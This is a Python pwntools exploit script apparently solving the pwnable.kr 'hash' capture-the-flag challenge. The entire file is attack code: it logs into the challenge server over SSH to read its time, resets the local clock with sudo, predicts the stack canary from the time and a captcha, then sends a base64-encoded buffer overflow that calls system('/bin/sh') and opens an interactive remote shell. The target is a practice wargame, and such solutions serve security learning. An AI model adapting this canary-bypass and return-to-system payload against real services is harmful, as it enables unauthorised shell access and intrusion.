from pwn import *
import time
import random

def toHex(source):
    tot=0
    n=1
    print (source)
    source=source[::-1]
    for i in source:
        if ord(i)>ord('9'):
            tmp=ord(i)-ord('a')+10
            tot=tot+tmp*n
        else:
            tmp=ord(i)-ord('0')
            tot=tot+tmp*n
        n=n*16
    return tot


time_ssh=ssh(host='pwnable.kr',user='asm',password='guest',port=2222)
time_shell=time_ssh.process(["/bin/sh"])
time_shell.sendline("date")
ser_time=time_shell.readline()
ser_time=ser_time[2:len(ser_time)].strip()

print ("("+ser_time+")")
ser_time=list(ser_time)
ser_time[18]=chr(ord(ser_time[18])+3)
ser_time="".join(ser_time)
print ("("+ser_time+")")
os.system("sudo date --set \""+ser_time+"\"")
t=time.time()

pwn=remote("pwnable.kr",9002)

#pwn=process(argv=["/home/etenal/pwnable.kr/hash/hash"])
pwn.readline()
junk,captcha=pwn.readline().split(':')
captcha=captcha[1:len(captcha)]
args=["/home/etenal/pwnable.kr/hash/randCalc",str(t),captcha.strip()]
subp=subprocess.Popen(args,stdout=subprocess.PIPE)
cookie=toHex(subp.communicate()[0].strip())

addr_system=0x08049187
addr_sh=0x0804b3b6
pwn.send(captcha);
print (p32(cookie),p32(addr_system),p32(addr_sh))
org_payload='\x41'*512+p32(cookie)+'\x90'*12+p32(addr_system)+p32(addr_sh)
payload=b64e(org_payload)+'\x00'*10+'/bin/sh'

print (len(payload))
pwn.sendline(payload)
pwn.interactive()

